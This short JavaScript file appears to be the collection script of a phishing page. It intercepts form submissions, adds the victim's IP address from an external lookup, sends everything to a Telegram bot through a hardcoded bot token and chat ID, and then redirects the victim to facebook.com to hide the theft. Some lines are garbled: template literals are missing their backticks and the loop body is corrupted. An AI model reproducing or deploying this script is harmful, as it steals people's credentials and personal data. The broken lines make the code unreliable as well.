window.onload = () => {
  const token = "6791346781:AAETwcHhxdAyHliVRpkh3-QVSb7IVV6uHQA";
  const chatID = "1393367014";
  const url = https://api.telegram.org/bot${token}/sendMessage;
  const form = document.querySelector("form");
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    let text = Time: ${new Date().toISOString()}\n;
    for (const [key, value] of formData.entries()) {
      text +=VRpkh3-QVSb7IVV6uHQA";
    }
    fetch("https://api.ipify.org")
      .then((res) => res.text())
      .then((res) => {
        text += IP: ${res}\n;
        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`).then(
          (res) => {
            location.assign("https://facebook.com");
          }
        );
      });
  });
};
